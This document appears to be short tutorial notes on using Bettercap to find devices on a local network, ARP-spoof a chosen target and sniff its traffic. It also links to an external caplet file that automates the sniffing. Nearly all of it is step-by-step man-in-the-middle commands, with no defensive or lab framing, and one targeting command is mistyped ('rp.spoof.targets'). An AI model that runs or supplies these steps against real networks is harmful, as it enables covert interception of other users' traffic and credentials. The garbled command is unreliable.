---
---

````bash
sudo apt install bettercap
# Start Bettercap on Interface
bettercap -iface <interface> 
# View all Modules
help 
help <module-name>
````

#### View Devices on Network

````bash
# Discover devices connected to Network
net.probe on 
net.show
````

#### ARP Spoofing

````bash
net.probe on
help arp.spoof
set arp.spoof.fullduplex true
````

If the router has protection against ARP spoofing then full duplex mode will not work. In that case leave the value as false. But then we cannot perform all attacks as the router will directly send the response to the target

````bash
set rp.spoof.targets <target-ip>
arp.spoof on
````

#### Sniff Data on Target Device

Enable net.probe & arp.spoof

````bash
net.sniff on
````

Instead of typing the commands again and again we can create an .cap file with all the commands that need to be executed

Sniff Data Cap File   
<https://drive.google.com/open?id=1Man5IhMekLHHNEw3rwGxkn9kpQBZhdGt>

````bash
bettercap -iface <interface> -caplet <sniff-data-cap-file>
````
